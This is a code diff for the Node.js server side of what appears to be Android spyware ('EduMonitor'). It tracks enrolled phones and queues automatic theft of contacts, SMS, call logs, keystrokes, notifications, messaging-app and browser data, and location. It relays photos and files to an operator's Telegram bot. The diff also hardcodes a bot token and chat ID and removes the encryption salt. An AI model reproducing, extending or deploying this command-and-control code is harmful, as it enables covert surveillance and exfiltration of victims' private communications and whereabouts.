@@ -1,5 +1,3 @@
-require('dotenv').config();
-
 const express = require('express');
 const axios = require('axios');
 const multer = require('multer');
@@ -7,39 +5,24 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const FormData = require('form-data');
-const { Octokit } = require('@octokit/rest');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const os = require('os');
-
-// ============= GITHUB GIST CONFIGURATION =============
-const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-const GIST_ID = process.env.GIST_ID;
-
-let octokit = null;
-if (GITHUB_TOKEN) {
-    octokit = new Octokit({ auth: GITHUB_TOKEN });
-    console.log('✅ GitHub client initialized for secondary server');
-} else {
-    console.log('⚠️ GITHUB_TOKEN not set, using local file storage only');
-}
-
-const GIST_FILES = {
-    DEVICES: 'devices.json',
-    AUTO_DATA: 'autodata.json',
-    FAILOVER_STATE: 'failover_state.json'
-};
 
 // ============= CONFIGURATION =============
 // IMPORTANT: For SECONDARY server, MAIN_BOT_TOKEN is empty
 // The secondary server uses its OWN bot token
 const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || '';
-const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN;
+const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN || '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE';
 const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://core-m0tr.onrender.com';
 
 // Current active configuration - start with secondary
 let activeBotToken = SECONDARY_BOT_TOKEN;
 let activeServerUrl = SECONDARY_SERVER_URL;
+
+// Persistent storage files
+const DEVICES_FILE = path.join(__dirname, 'devices.json');
+const AUTO_DATA_FILE = path.join(__dirname, 'autodata.json');
 
 // Store authorized devices and their commands
 const devices = new Map();
@@ -47,202 +30,12 @@ const userDeviceSelection = new Map();
 const userStates = new Map();
 
 // Store authorized chat IDs - use the SAME chat ID as main server
-const authorizedChats = new Set();
-const chatIdsFromEnv = process.env.AUTHORIZED_CHAT_IDS || '';
-chatIdsFromEnv.split(',').forEach(id => {
-    const trimmedId = id.trim();
-    if (trimmedId) {
-        authorizedChats.add(trimmedId);
-    }
-});
-
-if (authorizedChats.size === 0) {
-    console.error('❌ No authorized chat IDs configured!');
-    if (process.env.NODE_ENV === 'production') {
-        process.exit(1);
-    }
-} else {
-    console.log(`✅ Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-}
+const authorizedChats = new Set([
+    '8266841615',  // Your main Telegram chat ID
+]);
 
 // Auto-collection flags
 const autoDataRequested = new Map();
-
-// Failover state tracking
-let failoverState = {
-    isFailedOver: true,
-    failedOverAt: Date.now(),
-    originalBotToken: MAIN_BOT_TOKEN,
-    currentBotToken: SECONDARY_BOT_TOKEN,
-    currentServerUrl: SECONDARY_SERVER_URL,
-    failoverCount: 1
-};
-
-// Encryption salt
-const ENCRYPTION_SALT = process.env.ENCRYPTION_SALT;
-if (!ENCRYPTION_SALT) {
-    console.error('❌ ENCRYPTION_SALT is required for secondary server!');
-    if (process.env.NODE_ENV === 'production') {
-        process.exit(1);
-    }
-}
-
-// ============= GITHUB GIST STORAGE FUNCTIONS =============
-
-async function readFromGist(filename) {
-    if (!octokit || !GIST_ID) return null;
-    try {
-        const response = await octokit.gists.get({ gist_id: GIST_ID });
-        const fileContent = response.data.files[filename];
-        if (fileContent && fileContent.content) {
-            return JSON.parse(fileContent.content);
-        }
-        return null;
-    } catch (error) {
-        if (error.status === 404) {
-            console.log(`📝 Gist not found, will create new one on first save`);
-            return null;
-        }
-        console.error(`❌ Error reading ${filename} from Gist:`, error.message);
-        return null;
-    }
-}
-
-async function writeToGist(filename, data) {
-    if (!octokit) return false;
-    try {
-        const content = JSON.stringify(data, null, 2);
-        let allFiles = {};
-        if (GIST_ID) {
-            try {
-                const currentGist = await octokit.gists.get({ gist_id: GIST_ID });
-                for (const [name, file] of Object.entries(currentGist.data.files)) {
-                    if (name !== filename && file.content) {
-                        allFiles[name] = { content: file.content };
-                    }
-                }
-            } catch (error) {
-                console.log(`⚠️ Could not fetch current gist: ${error.message}`);
-            }
-        }
-        allFiles[filename] = { content: content };
-        if (!GIST_ID) {
-            const response = await octokit.gists.create({
-                description: 'EduMonitor Bot Storage - Secondary Server',
-                public: false,
-                files: allFiles
-            });
-            const newGistId = response.data.id;
-            console.log(`✅ Created new gist with ID: ${newGistId}`);
-            console.log(`⚠️ IMPORTANT: Add GIST_ID=${newGistId} to BOTH server environment variables!`);
-            return true;
-        } else {
-            await octokit.gists.update({ gist_id: GIST_ID, files: allFiles });
-            console.log(`💾 Saved ${filename} to shared GitHub Gist`);
-            return true;
-        }
-    } catch (error) {
-        console.error(`❌ Error writing ${filename} to Gist:`, error.message);
-        return false;
-    }
-}
-
-async function loadAllFromGist() {
-    console.log('🔄 Loading data from shared GitHub Gist...');
-    if (!octokit) return false;
-    try {
-        const devicesData = await readFromGist(GIST_FILES.DEVICES);
-        if (devicesData) {
-            devices.clear();
-            for (const [id, device] of Object.entries(devicesData)) {
-                devices.set(id, device);
-            }
-            console.log(`✅ Loaded ${devices.size} devices from shared Gist`);
-        }
-        const autoDataData = await readFromGist(GIST_FILES.AUTO_DATA);
-        if (autoDataData) {
-            autoDataRequested.clear();
-            for (const [id, flag] of Object.entries(autoDataData)) {
-                autoDataRequested.set(id, flag);
-            }
-            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from shared Gist`);
-        }
-        return true;
-    } catch (error) {
-        console.error('❌ Error loading from Gist:', error.message);
-        return false;
-    }
-}
-
-async function saveDevices() {
-    if (octokit) {
-        const devicesObj = {};
-        for (const [id, device] of devices.entries()) {
-            devicesObj[id] = device;
-        }
-        await writeToGist(GIST_FILES.DEVICES, devicesObj);
-    }
-    saveLocalBackup();
-}
-
-async function saveAutoDataFlags() {
-    if (octokit) {
-        const autoDataObj = {};
-        for (const [id, flag] of autoDataRequested.entries()) {
-            autoDataObj[id] = flag;
-        }
-        await writeToGist(GIST_FILES.AUTO_DATA, autoDataObj);
-    }
-    saveLocalBackup();
-}
-
-function saveLocalBackup() {
-    try {
-        const backupDir = path.join(__dirname, 'backup');
-        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
-        const devicesObj = {};
-        for (const [id, device] of devices.entries()) {
-            const sanitizedDevice = { ...device };
-            delete sanitizedDevice.pendingCommands;
-            devicesObj[id] = sanitizedDevice;
-        }
-        fs.writeFileSync(path.join(backupDir, 'devices.backup.json'), JSON.stringify(devicesObj, null, 2));
-        const autoDataObj = {};
-        for (const [id, flag] of autoDataRequested.entries()) {
-            autoDataObj[id] = flag;
-        }
-        fs.writeFileSync(path.join(backupDir, 'autodata.backup.json'), JSON.stringify(autoDataObj, null, 2));
-        console.log(`💾 Saved local backup`);
-    } catch (error) {
-        console.error('Error saving local backup:', error);
-    }
-}
-
-function loadLocalBackup() {
-    try {
-        const backupDir = path.join(__dirname, 'backup');
-        const devicesBackup = path.join(backupDir, 'devices.backup.json');
-        if (fs.existsSync(devicesBackup)) {
-            const data = fs.readFileSync(devicesBackup, 'utf8');
-            const savedDevices = JSON.parse(data);
-            for (const [id, device] of Object.entries(savedDevices)) {
-                devices.set(id, device);
-            }
-            console.log(`✅ Loaded ${devices.size} devices from local backup`);
-        }
-        const autoDataBackup = path.join(backupDir, 'autodata.backup.json');
-        if (fs.existsSync(autoDataBackup)) {
-            const data = fs.readFileSync(autoDataBackup, 'utf8');
-            const savedAutoData = JSON.parse(data);
-            for (const [id, flag] of Object.entries(savedAutoData)) {
-                autoDataRequested.set(id, flag);
-            }
-            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from local backup`);
-        }
-    } catch (error) {
-        console.error('Error loading local backup:', error);
-    }
-}
 
 // Create uploads directory
 const uploadDir = 'uploads';
@@ -252,10 +45,10 @@ if (!fs.existsSync(uploadDir)) {
 
 // ============= ENCRYPTION FUNCTIONS =============
 
+// Device-specific encryption (same as Android app)
 function encryptForDevice(data, deviceId) {
     try {
-        const combinedKey = deviceId + ENCRYPTION_SALT;
-        const key = crypto.createHash('sha256').update(combinedKey).digest();
+        const key = crypto.createHash('sha256').update(deviceId).digest();
         const iv = key.slice(0, 16);
         const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
         let encrypted = cipher.update(data, 'utf8', 'base64');
@@ -267,15 +60,76 @@ function encryptForDevice(data, deviceId) {
     }
 }
 
-// ============= DEVICE CONFIGURATION =============
-const defaultChatId = Array.from(authorizedChats)[0] || '';
+// ============= PERSISTENT STORAGE FUNCTIONS =============
 
+function loadDevices() {
+    try {
+        if (fs.existsSync(DEVICES_FILE)) {
+            const data = fs.readFileSync(DEVICES_FILE, 'utf8');
+            const savedDevices = JSON.parse(data);
+            for (const [id, device] of Object.entries(savedDevices)) {
+                devices.set(id, device);
+            }
+            console.log(`✅ Loaded ${devices.size} devices from persistent storage`);
+        } else {
+            console.log('📝 No existing devices file found, starting fresh');
+        }
+    } catch (error) {
+        console.error('Error loading devices:', error);
+    }
+}
+
+function saveDevices() {
+    try {
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            devicesObj[id] = device;
+        }
+        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devicesObj, null, 2));
+        console.log(`💾 Saved ${devices.size} devices to persistent storage`);
+    } catch (error) {
+        console.error('Error saving devices:', error);
+    }
+}
+
+function loadAutoDataFlags() {
+    try {
+        if (fs.existsSync(AUTO_DATA_FILE)) {
+            const data = fs.readFileSync(AUTO_DATA_FILE, 'utf8');
+            const savedAutoData = JSON.parse(data);
+            for (const [id, flag] of Object.entries(savedAutoData)) {
+                autoDataRequested.set(id, flag);
+            }
+            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags`);
+        }
+    } catch (error) {
+        console.error('Error loading auto-data flags:', error);
+    }
+}
+
+function saveAutoDataFlags() {
+    try {
+        const autoDataObj = {};
+        for (const [id, flag] of autoDataRequested.entries()) {
+            autoDataObj[id] = flag;
+        }
+        fs.writeFileSync(AUTO_DATA_FILE, JSON.stringify(autoDataObj, null, 2));
+    } catch (error) {
+        console.error('Error saving auto-data flags:', error);
+    }
+}
+
+// Load persistent data on startup
+loadDevices();
+loadAutoDataFlags();
+
+// ============= DEVICE CONFIGURATION =============
 const deviceConfigs = {
     'default': {
-        chatId: defaultChatId,
+        chatId: '8266841615',  // Same chat ID as main server
         config: {
-            chatId: defaultChatId,
-            botToken: SECONDARY_BOT_TOKEN,
+            chatId: '8266841615',
+            botToken: SECONDARY_BOT_TOKEN,  // Secondary bot token
             serverUrl: SECONDARY_SERVER_URL,
             pollingInterval: 15000,
             keepAliveInterval: 300000,
@@ -287,19 +141,44 @@ const deviceConfigs = {
             appOpenBatchSize: 50,
             syncBatchSize: 20,
             targetApps: [
-                'com.sec.android.gallery3d', 'com.samsung.android.messaging', 'com.android.chrome',
-                'com.google.android.youtube', 'com.google.android.apps.camera', 'com.sec.android.app.camera',
-                'com.android.camera', 'com.whatsapp', 'com.instagram.android', 'com.facebook.katana',
-                'com.snapchat.android', 'com.google.android.apps.maps', 'com.google.android.apps.messaging',
-                'com.microsoft.teams', 'com.zoom.us', 'com.discord', 'com.mediatek.camera',
-                'com.whatsapp.w4b', 'com.pri.filemanager', 'com.android.dialer', 'com.facebook.orca',
-                'com.google.android.apps.photosgo', 'com.tencent.mm', 'com.google.android.apps.photos',
+                'com.sec.android.gallery3d',
+                'com.samsung.android.messaging',
+                'com.android.chrome',
+                'com.google.android.youtube',
+                'com.google.android.apps.camera',
+                'com.sec.android.app.camera',
+                'com.android.camera',
+                'com.whatsapp',
+                'com.instagram.android',
+                'com.facebook.katana',
+                'com.snapchat.android',
+                'com.google.android.apps.maps',
+                'com.google.android.apps.messaging',
+                'com.microsoft.teams',
+                'com.zoom.us',
+                'com.discord',
+                'com.mediatek.camera',
+                'com.whatsapp.w4b',
+                'com.pri.filemanager',
+                'com.android.dialer',
+                'com.facebook.orca',
+                'com.google.android.apps.photosgo',
+                'com.tencent.mm',
+                'com.google.android.apps.photos',
                 'org.telegram.messenger'
             ],
             features: {
-                contacts: true, sms: true, callLogs: true, location: true, screenshots: true,
-                recordings: true, keystrokes: true, notifications: true, phoneInfo: true,
-                wifiInfo: true, mobileInfo: true,
+                contacts: true,
+                sms: true,
+                callLogs: true,
+                location: true,
+                screenshots: true,
+                recordings: true,
+                keystrokes: true,
+                notifications: true,
+                phoneInfo: true,
+                wifiInfo: true,
+                mobileInfo: true,
             }
         }
     }
@@ -311,7 +190,9 @@ function getDeviceConfig(deviceId) {
 
 // ============= FILE UPLOAD CONFIGURATION =============
 const storage = multer.diskStorage({
-    destination: (req, file, cb) => { cb(null, uploadDir); },
+    destination: (req, file, cb) => {
+        cb(null, uploadDir);
+    },
     filename: (req, file, cb) => {
         const deviceId = req.body.deviceId || 'unknown';
         const count = req.body.count || '0';
@@ -323,7 +204,10 @@ const storage = multer.diskStorage({
 
 const upload = multer({
     storage,
-    limits: { fileSize: 50 * 1024 * 1024, fieldSize: 50 * 1024 * 1024 }
+    limits: { 
+        fileSize: 50 * 1024 * 1024,
+        fieldSize: 50 * 1024 * 1024
+    }
 });
 
 // Middleware
@@ -332,11 +216,17 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // ============= HELPER FUNCTIONS =============
 
-function isAuthorizedChat(chatId) { return authorizedChats.has(String(chatId)); }
+function isAuthorizedChat(chatId) {
+    return authorizedChats.has(String(chatId));
+}
 
 function sendJsonResponse(res, data, statusCode = 200) {
-    try { res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data)); }
-    catch (e) { console.error('Error stringifying JSON:', e); res.status(500).json({ error: 'Internal server error' }); }
+    try {
+        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
+    } catch (e) {
+        console.error('Error stringifying JSON:', e);
+        res.status(500).json({ error: 'Internal server error' });
+    }
 }
 
 function getServerIP() {
@@ -344,14 +234,23 @@ function getServerIP() {
         const interfaces = os.networkInterfaces();
         for (const name of Object.keys(interfaces)) {
             for (const iface of interfaces[name]) {
-                if (iface.family === 'IPv4' && !iface.internal) return iface.address;
+                if (iface.family === 'IPv4' && !iface.internal) {
+                    return iface.address;
+                }
             }
         }
-    } catch (e) { console.error('Error getting server IP:', e); }
+    } catch (e) {
+        console.error('Error getting server IP:', e);
+    }
     return 'Unknown';
 }
 
-function getTelegramApiUrl() { return `https://api.telegram.org/bot${activeBotToken}`; }
+// Get current active Telegram API URL
+function getTelegramApiUrl() {
+    return `https://api.telegram.org/bot${activeBotToken}`;
+}
+
+// ============= DEVICE MANAGEMENT FUNCTIONS =============
 
 function getDeviceListForUser(chatId) {
     const userDevices = [];
@@ -373,14 +272,20 @@ function getDeviceListForUser(chatId) {
 function getDeviceSelectionKeyboard(chatId) {
     const userDevices = getDeviceListForUser(chatId);
     const keyboard = [];
+    
     userDevices.forEach(device => {
         const status = device.isActive ? '✅ ' : '';
         const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
-        keyboard.push([{ text: `${status}${device.name} (${lastSeen})`, callback_data: `select_device:${device.id}` }]);
+        keyboard.push([{
+            text: `${status}${device.name} (${lastSeen})`,
+            callback_data: `select_device:${device.id}`
+        }]);
     });
+    
     keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
     keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
     keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
+    
     return keyboard;
 }
 
@@ -390,8 +295,12 @@ function getMainMenuKeyboard(chatId) {
     const activeDeviceId = userDeviceSelection.get(chatId);
     const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
     const deviceCount = getDeviceListForUser(chatId).length;
+    
     let deviceStatus = `📱 ${deviceCount} device(s)`;
-    if (activeDevice) deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
+    if (activeDevice) {
+        deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
+    }
+
     return [
         [{ text: '📸 Screenshot', callback_data: 'menu_screenshot' }, { text: '📷 Camera', callback_data: 'menu_camera' }],
         [{ text: '🎤 Recording', callback_data: 'menu_recording' }, { text: '📍 Location', callback_data: 'cmd:location' }],
@@ -602,35 +511,71 @@ function getBotTokenKeyboard() {
 
 // ==================== INPUT PROMPT MENUS ====================
 
-function getAddTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
-function getRemoveTargetKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]]; }
-function getAddScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
-function getRemoveScanPathKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]]; }
-function getConfigureScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_settings' }]]; }
-function getCustomScheduleKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_recording_settings' }]]; }
-function getSetSyncIntervalKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]]; }
-function getSetServerBackupKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]]; }
+function getAddTargetKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]];
+}
+
+function getRemoveTargetKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]];
+}
+
+function getAddScanPathKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]];
+}
+
+function getRemoveScanPathKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]];
+}
+
+function getConfigureScheduleKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_settings' }]];
+}
+
+function getCustomScheduleKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_recording_settings' }]];
+}
+
+function getSetSyncIntervalKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]];
+}
+
+function getSetServerBackupKeyboard() {
+    return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]];
+}
 
 // ============= TELEGRAM MESSAGE FUNCTIONS =============
 
 async function sendTelegramMessage(chatId, text) {
     try {
-        if (!text || text.trim().length === 0) return null;
+        if (!text || text.trim().length === 0) {
+            console.error('❌ Attempted to send empty message');
+            return null;
+        }
+
         console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
+        
         const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
-            chat_id: chatId, text: text, parse_mode: 'HTML'
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML'
         });
-        console.log(`✅ Message sent successfully`);
+        
+        console.log(`✅ Message sent successfully to ${chatId}`);
         return response.data;
     } catch (error) {
         console.error('❌ Error sending message:', error.response?.data || error.message);
+        
         if (error.response?.status === 400) {
+            console.log('⚠️ HTML failed, retrying as plain text');
             try {
                 const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
-                    chat_id: chatId, text: text.replace(/<[^>]*>/g, '')
+                    chat_id: chatId,
+                    text: text.replace(/<[^>]*>/g, '')
                 });
                 return response.data;
-            } catch (e) { console.error('❌ Plain text also failed:', e.response?.data || e.message); }
+            } catch (e) {
+                console.error('❌ Plain text also failed:', e.response?.data || e.message);
+            }
         }
         return null;
     }
@@ -639,9 +584,16 @@ async function sendTelegramMessage(chatId, text) {
 async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
     try {
         console.log(`📨 Sending message with inline keyboard to ${chatId}`);
+        
         const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
-            chat_id: chatId, text: text, parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard }
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
         });
+        
         console.log(`✅ Message with keyboard sent successfully`);
         return response.data;
     } catch (error) {
@@ -653,16 +605,18 @@ async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
 async function editMessageKeyboard(chatId, messageId, newKeyboard) {
     try {
         console.log(`🔄 Editing keyboard for message ${messageId}`);
+        
         const response = await axios.post(`${getTelegramApiUrl()}/editMessageReplyMarkup`, {
-            chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: newKeyboard }
+            chat_id: chatId,
+            message_id: messageId,
+            reply_markup: {
+                inline_keyboard: newKeyboard
+            }
         });
+        
         console.log(`✅ Keyboard updated`);
         return response.data;
     } catch (error) {
-        if (error.response?.data?.description?.includes('message is not modified')) {
-            console.log(`⏭️ Keyboard already up to date`);
-            return null;
-        }
         console.error('❌ Error editing keyboard:', error.response?.data || error.message);
         return null;
     }
@@ -670,13 +624,19 @@ async function editMessageKeyboard(chatId, messageId, newKeyboard) {
 
 async function answerCallbackQuery(callbackQueryId, text = null) {
     try {
-        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, { callback_query_id: callbackQueryId, text: text });
-    } catch (error) { console.error('Error answering callback query:', error.response?.data || error.message); }
+        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, {
+            callback_query_id: callbackQueryId,
+            text: text
+        });
+    } catch (error) {
+        console.error('Error answering callback query:', error.response?.data || error.message);
+    }
 }
 
 async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
+        
         const commands = [
             { command: 'help', description: '📋 Complete help menu' },
             { command: 'showmenu', description: '📋 Show help menu' },
@@ -687,32 +647,53 @@ async function setChatMenuButton(chatId) {
             { command: 'location', description: '📍 Get location' },
             { command: 'sync_all', description: '🔄 Sync all data' }
         ];
+        
         await axios.post(`${getTelegramApiUrl()}/setMyCommands`, { commands });
+        
         await axios.post(`${getTelegramApiUrl()}/setChatMenuButton`, {
-            chat_id: chatId, menu_button: { type: 'commands', text: 'Menu' }
+            chat_id: chatId,
+            menu_button: {
+                type: 'commands',
+                text: 'Menu'
+            }
         });
-        console.log(`✅ Menu button and ${commands.length} commands set`);
-    } catch (error) { console.error('Error setting menu button:', error.response?.data || error.message); }
+        
+        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
+    } catch (error) {
+        console.error('Error setting menu button:', error.response?.data || error.message);
+    }
 }
 
 async function sendTelegramDocument(chatId, filePath, filename, caption) {
     try {
         console.log(`📎 Sending document to ${chatId}: ${filename}`);
+        
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('document', fs.createReadStream(filePath), { filename });
         formData.append('caption', caption);
+        
         const response = await axios.post(`${getTelegramApiUrl()}/sendDocument`, formData, {
-            headers: { ...formData.getHeaders() }, maxContentLength: Infinity, maxBodyLength: Infinity
+            headers: {
+                ...formData.getHeaders()
+            },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
         });
-        console.log(`✅ Document sent successfully`);
+        
+        console.log(`✅ Document sent successfully to ${chatId}`);
         return response.data;
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
+        
         try {
             const stats = fs.statSync(filePath);
-            await sendTelegramMessage(chatId, `⚠️ File too large to send directly.\n\nThe file is ${(stats.size / 1024).toFixed(2)} KB.`);
-        } catch (e) { console.error('Error sending fallback message:', e); }
+            await sendTelegramMessage(chatId, 
+                `⚠️ File too large to send directly.\n\n` +
+                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
+        } catch (e) {
+            console.error('Error sending fallback message:', e);
+        }
         return null;
     }
 }
@@ -723,30 +704,81 @@ function formatLocationMessage(locationData) {
     try {
         let locData = locationData;
         if (typeof locationData === 'string') {
-            try { locData = JSON.parse(locationData); } catch (e) { return { text: locationData }; }
+            try {
+                locData = JSON.parse(locationData);
+            } catch (e) {
+                return { text: locationData };
+            }
         }
+
         if (locData.lat && locData.lon) {
-            const lat = locData.lat, lon = locData.lon, accuracy = locData.accuracy || 'Unknown', provider = locData.provider || 'unknown';
+            const lat = locData.lat;
+            const lon = locData.lon;
+            const accuracy = locData.accuracy || 'Unknown';
+            const provider = locData.provider || 'unknown';
+            
             const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
             return {
-                text: `📍 <b>Location Update</b>\n\n• <b>Latitude:</b> <code>${lat}</code>\n• <b>Longitude:</b> <code>${lon}</code>\n• <b>Accuracy:</b> ±${accuracy}m\n• <b>Provider:</b> ${provider}\n\n🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
-                mapsUrl: mapsUrl, lat: lat, lon: lon
+                text: `📍 <b>Location Update</b>\n\n` +
+                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
+                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
+                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
+                      `• <b>Provider:</b> ${provider}\n\n` +
+                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
+                mapsUrl: mapsUrl,
+                lat: lat,
+                lon: lon
             };
         }
         return { text: locationData };
-    } catch (error) { console.error('Error formatting location:', error); return { text: locationData }; }
+    } catch (error) {
+        console.error('Error formatting location:', error);
+        return { text: locationData };
+    }
 }
 
 // ============= AUTO DATA COLLECTION =============
 
 function queueAutoDataCommands(deviceId, chatId) {
     console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
-    if (autoDataRequested.has(deviceId)) { console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`); return; }
-    autoDataRequested.set(deviceId, { timestamp: Date.now(), requested: ['device_info', 'network_info', 'mobile_info', 'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'whatsapp', 'telegram', 'facebook', 'browser', 'location'] });
+    
+    if (autoDataRequested.has(deviceId)) {
+        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
+        return;
+    }
+    
+    autoDataRequested.set(deviceId, {
+        timestamp: Date.now(),
+        requested: [
+            'device_info',
+            'network_info',
+            'mobile_info',
+            'contacts',
+            'sms',
+            'calllogs',
+            'apps_list',
+            'keys',
+            'notify',
+            'whatsapp',
+            'telegram',
+            'facebook',
+            'browser',
+            'location'
+        ]
+    });
     saveAutoDataFlags();
+    
     const device = devices.get(deviceId);
-    if (!device) { console.error(`❌ Device not found for auto-data: ${deviceId}`); return; }
-    if (!device.pendingCommands) device.pendingCommands = [];
+    if (!device) {
+        console.error(`❌ Device not found for auto-data: ${deviceId}`);
+        return;
+    }
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
     const commands = [
         { command: 'device_info', delay: 0, description: 'Device Info' },
         { command: 'network_info', delay: 5, description: 'Network Info' },
@@ -763,45 +795,109 @@ function queueAutoDataCommands(deviceId, chatId) {
         { command: 'browser', delay: 60, description: 'Browser History' },
         { command: 'location', delay: 65, description: 'Location' }
     ];
+    
     commands.forEach((cmd) => {
-        device.pendingCommands.push({ command: cmd.command, originalCommand: `/${cmd.command}`, messageId: null, timestamp: Date.now() + (cmd.delay * 1000), autoData: true });
+        const commandObject = {
+            command: cmd.command,
+            originalCommand: `/${cmd.command}`,
+            messageId: null,
+            timestamp: Date.now() + (cmd.delay * 1000),
+            autoData: true
+        };
+        
+        device.pendingCommands.push(commandObject);
         console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
     });
+    
     console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
     saveDevices();
 }
 
-// ============= API ENDPOINTS =============
+// ============= CRITICAL: COMPLETE CONFIG ENDPOINT =============
 
 app.get('/api/device/:deviceId/complete-config', (req, res) => {
     const deviceId = req.params.deviceId;
-    console.log(`🔐 Complete config requested from secondary server for device: ${deviceId}`);
+    console.log(`🔐 Complete config requested for device: ${deviceId}`);
+    
+    // Don't require device to exist for first-time registration
+    // Just return the server's own config
+    
     const deviceConfig = getDeviceConfig(deviceId);
+    
+    // Encrypt the bot token and chat ID for this specific device
     const encryptedToken = encryptForDevice(activeBotToken, deviceId);
     const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
-    res.json({ encrypted_token: encryptedToken, encrypted_chat_id: encryptedChatId, server_url: activeServerUrl, server_type: 'secondary', timestamp: Date.now() });
+    
+    const response = {
+        encrypted_token: encryptedToken,
+        encrypted_chat_id: encryptedChatId,
+        server_url: activeServerUrl,
+        timestamp: Date.now()
+    };
+    
+    console.log(`✅ Complete config sent to ${deviceId}`);
+    console.log(`   Server URL: ${activeServerUrl}`);
+    
+    res.json(response);
 });
+
+// ============= PHOTO UPLOAD ENDPOINT =============
 
 app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     try {
         const deviceId = req.body.deviceId;
         const caption = req.body.caption || '📸 Camera Photo';
-        if (!deviceId || !req.file) return res.status(400).json({ error: 'Missing fields' });
+        
+        if (!deviceId || !req.file) {
+            console.error('❌ Missing fields in photo upload');
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
+        
         const device = devices.get(deviceId);
-        if (!device) return res.status(404).json({ error: 'Device not found' });
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
         const chatId = device.chatId;
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
         const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
+        
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
         formData.append('caption', fullCaption);
